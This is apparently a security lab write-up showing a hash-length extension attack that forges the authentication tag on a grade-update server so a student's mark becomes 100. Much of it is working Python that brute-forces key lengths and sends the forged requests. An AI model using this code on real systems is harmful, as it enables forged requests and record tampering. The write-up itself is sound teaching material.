In this lab, we implement a hash-length extension attack using a module created by
[Stefano Palazzo](https://github.com/stephenbradshaw/hlextend/blob/master/hlextend.py).

## System Setup

***

Our target is a server where only authorized users are supposed to update a student's grades.
A legitimate update would be done by sending a `GET` request with a query string which looks like

```
<url>?tag=82f667c5077f20550477b512f862f3b9bde0adaf73371cb6ff85feabc63cda49&sid=1234567890&mark=100
```

where `sid` is the student id of the student to update and `mark` is the value used to set tha grade.
`tag` is a SHA2 HMAC which the server uses to verify the authenticity of the request.
Here, the webapp assumes only authorized users are able to create the HMAC which corresponds
to a query which updates a student grade.

In order to see their own grades, students are given the tag which corresponds to their own
`sid` and they can send a query which looks something like

```
<url>?tag=72c890741cf747b72a7a55bb07c52d67410fb60396893210dc1388246d33b3f8&sid=1234567890
```

and only returns the current score. We show an example of how to exploit the hash-length extension
vulnerability.

## Updating the Hash Function State

***

Similar to our attacks in the cryptopals challenges which preceded this one, we need to update the
internal state of the hash function. Instead of doing so manually, we will use the aforementioned
`hlextend` module to help us

```python
from urllib.parse import urlparse, parse_qs, quote
import http.client
import hlextend

def attack(url):
    # parameter url is the attack url you construct
    parsed = urlparse(url)
    prefix_tag = parse_qs(parsed.query)['tag'][0]
    prefix_sid = parse_qs(parsed.query)['sid'][0]
    extend = '&sid=' + prefix_sid + '&mark=100'

    sha2 = hlextend.new('sha256')
    sha2.set_state(prefix_tag)
    sha2.update(extend.encode())
    ret_tag = sha2.hexdigest()
```

`set_state()` sets the internal state to what it would look like after producing the hash and
`update()` updates the internal state to include the string we want to append. We save the
digest this produces and all that remains is to guess at the length of the original message.

## Performing the Attack

***

Since we do not know the key size, we just brute force a few likely candidates, say, between 8 and 20.
For each of those, the module computes the sha2 padding for us and we
[quote](https://docs.python.org/dev/library/urllib.parse.html#urllib.parse.quote)
it so it is a safe URL to send.

```python
    for i in range(8, 21):
        ret_q = 'sid=' + prefix_sid + quote(sha2.padding(i + len("sid=" + prefix_sid))) + '&sid=' + prefix_sid + '&mark=100'
        q = "tag=" + ret_tag + "&" + ret_q
        # open a connection to the server
        httpconn = http.client.HTTPConnection(parsed.hostname, parsed.port)

        # issue server-API request
        httpconn.request("GET", "/?" + q)

        # httpresp is response object containing a status value and possible message
        httpresp = httpconn.getresponse()

        # valid request will result in httpresp.status value 200
        if (httpresp.status == 200):
            return parsed.scheme + "://" + parsed.netloc + parsed.path + "?" + q
```

This returns status `200` or `OK` which tells us our attack succeeded.
